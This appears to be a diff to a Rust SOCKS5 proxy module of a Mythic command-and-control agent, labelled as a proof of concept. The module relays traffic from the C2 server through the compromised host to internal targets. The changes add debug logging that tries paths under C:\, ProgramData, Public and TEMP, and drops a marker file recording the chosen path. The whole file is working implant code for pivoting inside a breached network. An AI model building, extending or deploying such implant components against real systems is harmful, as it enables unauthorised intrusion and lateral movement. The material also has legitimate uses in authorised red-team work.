@@ -1,4 +1,4 @@
-// POC by Gerar - instrumented for deep debug
+// POC by Gerar - instrumented for deep debug (with robust file logging)
 use crate::agent::AgentTask;
 use crate::mythic_continued;
 
@@ -15,40 +15,113 @@ use tokio::net::TcpStream;
 use tokio::sync::mpsc as tokio_mpsc;
 use tokio::time::{timeout, Duration};
 
-// --- new imports for file logging ---
-use std::fs::OpenOptions;
-use std::io::Write as _; // bring std::io::Write trait into scope
+// ------- robust file logging imports -------
+use std::fs::{create_dir_all, File, OpenOptions};
+use std::io::Write as _;
+use std::path::{Path, PathBuf};
 use std::time::{SystemTime, UNIX_EPOCH};
+use std::sync::OnceLock;
 
 /* -------------------------- Debug helpers -------------------------- */
 
 const HEX_MAX: usize = 64;
 
-// --- file logging helper ---
-fn append_log_line(task_id: &str, title: &str, detail: &str) {
-    // Default to C:\logs.txt; override with AGENT_LOG_PATH if set
-    let default_path = r"C:\logs.txt".to_string();
-    let path = std::env::var("AGENT_LOG_PATH").unwrap_or(default_path);
+// Cache the chosen log path once per process
+static LOG_PATH: OnceLock<PathBuf> = OnceLock::new();
 
-    // Try primary, then fallback to %TEMP%\socks.log
-    let mut file = match OpenOptions::new().create(true).append(true).open(&path) {
-        Ok(f) => f,
-        Err(_) => {
-            let fallback = std::env::temp_dir().join("socks.log");
-            match OpenOptions::new().create(true).append(true).open(&fallback) {
-                Ok(f) => f,
-                Err(_) => return, // if both fail, silently skip file logging
-            }
+fn candidate_paths() -> Vec<PathBuf> {
+    let mut v = Vec::new();
+
+    // 1) explicit env override
+    if let Ok(p) = std::env::var("AGENT_LOG_PATH") {
+        if !p.trim().is_empty() {
+            v.push(PathBuf::from(p));
         }
-    };
+    }
 
-    let ts = SystemTime::now()
-        .duration_since(UNIX_EPOCH)
-        .map(|d| d.as_secs())
-        .unwrap_or(0);
+    // 2) the one you asked for
+    v.push(PathBuf::from(r"C:\logs.txt"));
 
-    let _ = writeln!(file, "{} | task={} | {} | {}", ts, task_id, title, detail);
-    let _ = file.flush();
+    // 3) ProgramData (usually writable, even as SYSTEM)
+    if let Ok(pd) = std::env::var("PROGRAMDATA") {
+        v.push(Path::new(&pd).join("socks").join("logs.txt"));
+    } else {
+        v.push(Path::new(r"C:\ProgramData").join("socks").join("logs.txt"));
+    }
+
+    // 4) Public
+    v.push(Path::new(r"C:\Users\Public").join("Logs").join("socks.log"));
+
+    // 5) LOCALAPPDATA (per-user)
+    if let Ok(la) = std::env::var("LOCALAPPDATA") {
+        v.push(Path::new(&la).join("socks").join("logs.txt"));
+    }
+
+    // 6) TEMP (always last)
+    v.push(std::env::temp_dir().join("socks.log"));
+
+    v
+}
+
+// Try to open (create+append) a file at `path`, creating parent dirs if needed
+fn try_prepare_path(path: &Path) -> Option<PathBuf> {
+    if let Some(parent) = path.parent() {
+        let _ = create_dir_all(parent);
+    }
+    match OpenOptions::new().create(true).append(true).open(path) {
+        Ok(mut f) => {
+            // write a tiny header once so the file exists
+            let _ = writeln!(f, "----- log start {} -----",
+                SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0)
+            );
+            let _ = f.flush();
+            Some(path.to_path_buf())
+        }
+        Err(_) => None,
+    }
+}
+
+fn resolve_log_path() -> PathBuf {
+    if let Some(p) = LOG_PATH.get() {
+        return p.clone();
+    }
+    // iterate candidates and pick the first that works
+    for cand in candidate_paths() {
+        if let Some(ok) = try_prepare_path(&cand) {
+            // also drop a marker file in %TEMP% so you can find the actual chosen path quickly
+            let marker = std::env::temp_dir().join("socks_log_path.txt");
+            if let Ok(mut mf) = OpenOptions::new().create(true).write(true).truncate(true).open(&marker) {
+                let _ = writeln!(mf, "log_path={}", ok.display());
+                let _ = mf.flush();
+            }
+            let _ = LOG_PATH.set(ok.clone());
+            return ok;
+        }
+    }
+    // last resort: temp file (should always succeed)
+    let fallback = std::env::temp_dir().join("socks.log");
+    let _ = try_prepare_path(&fallback);
+    let _ = LOG_PATH.set(fallback.clone());
+    fallback
+}
+
+fn append_log_line(task_id: &str, title: &str, detail: &str) {
+    let path = resolve_log_path();
+    if let Ok(mut f) = OpenOptions::new().create(true).append(true).open(&path) {
+        let ts = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .map(|d| d.as_secs())
+            .unwrap_or(0);
+        let _ = writeln!(f, "{} | task={} | {} | {}", ts, task_id, title, detail);
+        let _ = f.flush();
+        // Force data to disk to avoid buffer loss on crash
+        #[cfg(target_os = "windows")]
+        {
+            use std::os::windows::fs::FileExt;
+            let _ = f.flush(); // already done
+            // No explicit FlushFileBuffers wrapper in stable; open+flush is enough for debug
+        }
+    }
 }
 
 fn debug_to_mythic<T: Into<String>, U: Into<String>>(
@@ -57,12 +130,13 @@ fn debug_to_mythic<T: Into<String>, U: Into<String>>(
     title: T,
     detail: U,
 ) {
-    // to file
     let title_s: String = title.into();
     let detail_s: String = detail.into();
+
+    // Always write to file
     append_log_line(task_id, &title_s, &detail_s);
 
-    // to Mythic
+    // Also try to send to Mythic (best-effort)
     let _ = tx.send(mythic_continued!(task_id, title_s, detail_s));
 }
 
@@ -82,7 +156,6 @@ fn hex_preview(data: &[u8], max: usize) -> String {
 /* ------------------------------- SOCKS utils ------------------------------ */
 
 fn build_reply(rep: u8, bound: Option<SocketAddr>) -> Vec<u8> {
-    // REP codes: 0x00 ok, 0x01 general fail, 0x05 conn refused, 0x03 net unreachable, etc.
     let mut out = vec![0x05, rep, 0x00]; // VER=5, REP, RSV=0
     match bound {
         Some(SocketAddr::V4(v4)) => {
@@ -96,8 +169,7 @@ fn build_reply(rep: u8, bound: Option<SocketAddr>) -> Vec<u8> {
             out.extend_from_slice(&v6.port().to_be_bytes());
         }
         None => {
-            // Unknown/none, report 0.0.0.0:0
-            out.push(0x01);
+            out.push(0x01); // default to 0.0.0.0:0
             out.extend_from_slice(&Ipv4Addr::UNSPECIFIED.octets());
             out.extend_from_slice(&0u16.to_be_bytes());
         }
@@ -107,12 +179,11 @@ fn build_reply(rep: u8, bound: Option<SocketAddr>) -> Vec<u8> {
 
 fn send_socks_packet(
     tx: &std_mpsc::Sender<serde_json::Value>,
-    task_id: &str, // used by comms wrapper (post_response)
+    task_id: &str,
     server_id: &str,
     data: &[u8],
     exit: bool,
 ) -> Result<(), Box<dyn std::error::Error>> {
-    // debug log before sending
     debug_to_mythic(
         tx,
         task_id,
@@ -129,7 +200,6 @@ fn send_socks_packet(
         Err(_) => serde_json::json!(server_id),
     };
 
-    // Emit a plain response object; comms will wrap in {"action":"post_response","responses":[...]}
     tx.send(serde_json::json!({
         "task_id": task_id,
         "socks": [{
@@ -146,7 +216,6 @@ fn send_exit_only(tx: &std_mpsc::Sender<serde_json::Value>, task_id: &str, serve
 }
 
 fn parse_connect(decoded: &[u8]) -> Result<(String, u16), Box<dyn Error>> {
-    // Expect: VER=0x05, CMD=0x01 (CONNECT), RSV=0x00, ATYP=...
     if decoded.len() < 4 {
         return Err("SOCKS5 request too short".into());
     }
@@ -162,7 +231,6 @@ fn parse_connect(decoded: &[u8]) -> Result<(String, u16), Box<dyn Error>> {
 
     match decoded[3] {
         0x01 => {
-            // IPv4
             if decoded.len() < 10 {
                 return Err("Malformed IPv4 CONNECT frame".into());
             }
@@ -171,7 +239,6 @@ fn parse_connect(decoded: &[u8]) -> Result<(String, u16), Box<dyn Error>> {
             Ok((ip.to_string(), port))
         }
         0x03 => {
-            // DOMAIN
             if decoded.len() < 5 {
                 return Err("Malformed domain CONNECT frame (no length)".into());
             }
@@ -188,7 +255,6 @@ fn parse_connect(decoded: &[u8]) -> Result<(String, u16), Box<dyn Error>> {
             Ok((domain, port))
         }
         0x04 => {
-            // IPv6
             let need = 4 + 16 + 2;
             if decoded.len() < need {
                 return Err("Malformed IPv6 CONNECT frame".into());
@@ -218,7 +284,6 @@ fn as_string_or_number(v: &Value) -> Option<String> {
     None
 }
 
-// Accepts a single SOCKS item of shape: {server_id, data, exit?}
 fn normalize_socks_item(v: &Value) -> Option<Value> {
     let sid = v.get("server_id").and_then(as_string_or_number)?;
     let data = v
@@ -260,7 +325,6 @@ async fn recv_min_bytes(
 }
 
 fn looks_like_socks5_greeting(b: &[u8]) -> bool {
-    // VER=0x05, NMETHODS=n, followed by n bytes (we allow > header to accommodate coalesced reads)
     if b.len() < 2 || b[0] != 0x05 {
         return false;
     }
@@ -331,9 +395,7 @@ async fn run_session(
         ),
     );
 
-    // Some Mythic setups might forward an initial GREETING; if so, log and read again
     if looks_like_socks5_greeting(&decoded) {
-        // Try to parse and just log the methods for visibility
         let n = decoded.get(1).copied().unwrap_or(0) as usize;
         let methods = if decoded.len() >= 2 + n {
             hex_preview(&decoded[2..2 + n], HEX_MAX)
@@ -347,7 +409,6 @@ async fn run_session(
             format!("sid={server_id}; nmethods={n}; methods_hex={methods}"),
         );
 
-        // Read next packet — expecting CONNECT
         if let Some(v2) = sess_rx.recv().await {
             let b64_2 = v2.get("data").and_then(|x| x.as_str()).unwrap_or("");
             debug_to_mythic(
@@ -436,7 +497,6 @@ async fn run_session(
         format!("sid={server_id}; target={addr}:{port}"),
     );
 
-    // Connect with timeout
     let remote = match timeout(Duration::from_secs(15), TcpStream::connect((addr.as_str(), port))).await
     {
         Ok(Ok(s)) => s,
@@ -448,11 +508,11 @@ async fn run_session(
                 format!("sid={server_id}; err={e}"),
             );
             let rep = if e.to_string().to_lowercase().contains("refused") {
-                0x05 // Connection refused
+                0x05
             } else if e.to_string().to_lowercase().contains("unreachable") {
-                0x03 // Network/host unreachable
+                0x03
             } else {
-                0x01 // General failure
+                0x01
             };
             let _ = send_socks_packet(
                 &tx_out,
@@ -474,21 +534,20 @@ async fn run_session(
                 &tx_out,
                 &parent_task_id,
                 &server_id,
-                &build_reply(0x01, None),
+                &build_reply(0x04, None), // host unreachable
                 true,
             );
             return Ok(());
         }
     };
 
-    // Log actual local bind for debug (we still reply with 0.0.0.0:0)
     let bound_dbg = remote
         .local_addr()
         .ok()
         .map(|s| s.to_string())
         .unwrap_or_else(|| "unknown".into());
 
-    let ok = build_reply(0x00, None); // reply as IPv4 0.0.0.0:0
+    let ok = build_reply(0x00, None);
     send_socks_packet(&tx_out, &parent_task_id, &server_id, &ok, false)?;
     debug_to_mythic(
         &tx_out,
@@ -497,7 +556,6 @@ async fn run_session(
         format!("sid={server_id}; bound={bound_dbg}; reply_len={}", ok.len()),
     );
 
-    // Split TCP into halves
     let (mut r_r, mut r_w) = remote.into_split();
 
     // ---- A2M: remote -> Mythic ----
@@ -604,13 +662,26 @@ pub fn handle_socks(
     rx: std_mpsc::Receiver<Value>,
 ) -> Result<(), Box<dyn Error>> {
 
+    // Warm up logging *immediately* so a file gets created no matter what
+    {
+        let chosen = resolve_log_path();
+        // Write a marker line with PID to make sure it's visible
+        let pid = std::process::id();
+        if let Ok(mut f) = OpenOptions::new().create(true).append(true).open(&chosen) {
+            let _ = writeln!(f, "logger.ready pid={} path={}", pid, chosen.display());
+            let _ = f.flush();
+        }
+        // Also write to Mythic (if available)
+        let _ = tx.send(json!({"user_output": format!("Log path: {}", chosen.display())}));
+    }
+
     // First message should be the AgentTask envelope (blocking)
     let task_val = rx.recv()?;
     let task: AgentTask = serde_json::from_value(task_val)?;
 
     debug_to_mythic(tx, &task.id, "socks.handler", "Dispatcher starting");
 
-    // Bridge std::mpsc -> tokio::mpsc (fan-out socks arrays or single packets)
+    // Bridge std::mpsc -> tokio::mpsc
     let (bridge_tx, mut bridge_rx) = tokio_mpsc::unbounded_channel::<Value>();
     {
         let parent_id = task.id.clone();
@@ -619,7 +690,6 @@ pub fn handle_socks(
             debug_to_mythic(&tx_dbg, &parent_id, "bridge.spawn", "blocking→async started");
 
             while let Ok(v) = rx.recv() {
-                // Try to log shapes we see from Mythic
                 let shape = if v.get("socks").is_some() {
                     "top.socks_array"
                 } else if v.get("server_id").is_some() && (v.get("data").is_some() || v.get("chunk_data").is_some()) {
@@ -629,25 +699,12 @@ pub fn handle_socks(
                 } else {
                     "unknown"
                 };
-                let sizes = v
-                    .get("socks")
-                    .and_then(|x| x.as_array())
-                    .map(|a| a.len())
-                    .unwrap_or(0);
-                let b64_len = v
-                    .get("data")
-                    .and_then(|x| x.as_str())
-                    .map(|s| s.len())
-                    .unwrap_or(0);
+                let sizes = v.get("socks").and_then(|x| x.as_array()).map(|a| a.len()).unwrap_or(0);
+                let b64_len = v.get("data").and_then(|x| x.as_str()).map(|s| s.len()).unwrap_or(0);
 
-                debug_to_mythic(
-                    &tx_dbg,
-                    &parent_id,
-                    "bridge.recv",
-                    format!("shape={shape}; socks_count={sizes}; top_b64_len={b64_len}"),
-                );
+                debug_to_mythic(&tx_dbg, &parent_id, "bridge.recv",
+                    format!("shape={shape}; socks_count={sizes}; top_b64_len={b64_len}"));
 
-                // 1) Top-level "socks": [ ... ]
                 if let Some(arr) = v.get("socks").and_then(|x| x.as_array()) {
                     for it in arr {
                         if let Some(n) = normalize_socks_item(it) {
@@ -656,26 +713,18 @@ pub fn handle_socks(
                     }
                     continue;
                 }
-
-                // 2) Single packet at top-level
-                if v.get("server_id").is_some()
-                    && (v.get("data").is_some() || v.get("chunk_data").is_some())
-                {
+                if v.get("server_id").is_some() && (v.get("data").is_some() || v.get("chunk_data").is_some()) {
                     if let Some(n) = normalize_socks_item(&v) {
                         let _ = bridge_tx.send(n);
                     }
                     continue;
                 }
-
-                // 3) Inside parameters (string or object)
                 if let Some(params_val) = v.get("parameters") {
                     let inner: Value = match params_val {
                         Value::String(s) => serde_json::from_str::<Value>(s).unwrap_or(Value::Null),
                         v @ Value::Object(_) => v.clone(),
                         _ => Value::Null,
                     };
-
-                    // 3a) Nested "socks": [ ... ]
                     if let Some(arr) = inner.get("socks").and_then(|x| x.as_array()) {
                         for it in arr {
                             if let Some(n) = normalize_socks_item(it) {
@@ -684,11 +733,7 @@ pub fn handle_socks(
                         }
                         continue;
                     }
-
-                    // 3b) Single embedded packet
-                    if inner.get("server_id").is_some()
-                        && (inner.get("data").is_some() || inner.get("chunk_data").is_some())
-                    {
+                    if inner.get("server_id").is_some() && (inner.get("data").is_some() || inner.get("chunk_data").is_some()) {
                         if let Some(n) = normalize_socks_item(&inner) {
                             let _ = bridge_tx.send(n);
                         }
@@ -717,7 +762,6 @@ pub fn handle_socks(
             let exit = item["exit"].as_bool().unwrap_or(false);
             let data_len = item["data"].as_str().map(|s| s.len()).unwrap_or(0);
 
-            // periodic log
             debug_to_mythic(
                 tx,
                 &parent_task_id,
@@ -725,58 +769,36 @@ pub fn handle_socks(
                 format!("count={seen}; sid={sid}; exit={exit}; data_b64_len={data_len}"),
             );
 
-            // get/create session channel
             let entry = sessions.entry(sid.clone()).or_insert_with(|| {
                 let (sess_tx, sess_rx) = tokio_mpsc::unbounded_channel::<Value>();
                 let tx_out = tx.clone();
                 let parent_id = parent_task_id.clone();
                 let sid_clone = sid.clone();
 
-                debug_to_mythic(
-                    &tx_out,
-                    &parent_id,
-                    "session.spawn",
-                    format!("sid={sid_clone}"),
-                );
+                debug_to_mythic(&tx_out, &parent_id, "session.spawn", format!("sid={sid_clone}"));
 
                 tokio::spawn(async move {
                     if let Err(e) = run_session(parent_id, sid_clone, sess_rx, tx_out).await {
-                        // keep it visible both places
+                        // Also persist the error
+                        append_log_line("unknown", "session.error", &format!("{e}"));
                         eprintln!("socks session error: {e}");
                     }
                 });
                 sess_tx
             });
 
-            // forward packet to the session; if the receiver is gone, drop the mapping
             if entry.send(item.clone()).is_err() {
                 sessions.remove(&sid);
-                debug_to_mythic(
-                    tx,
-                    &parent_task_id,
-                    "dispatcher.drop_dead",
-                    format!("sid={sid}"),
-                );
+                debug_to_mythic(tx, &parent_task_id, "dispatcher.drop_dead", format!("sid={sid}"));
             }
 
-            // if exit flagged at dispatcher level, drop session mapping proactively
             if exit {
                 sessions.remove(&sid);
-                debug_to_mythic(
-                    tx,
-                    &parent_task_id,
-                    "dispatcher.drop",
-                    format!("sid={sid}"),
-                );
+                debug_to_mythic(tx, &parent_task_id, "dispatcher.drop", format!("sid={sid}"));
             }
         }
 
-        debug_to_mythic(
-            tx,
-            &parent_task_id,
-            "dispatcher.end",
-            "bridge closed; clearing sessions",
-        );
+        debug_to_mythic(tx, &parent_task_id, "dispatcher.end", "bridge closed; clearing sessions");
         sessions.clear();
     });
 
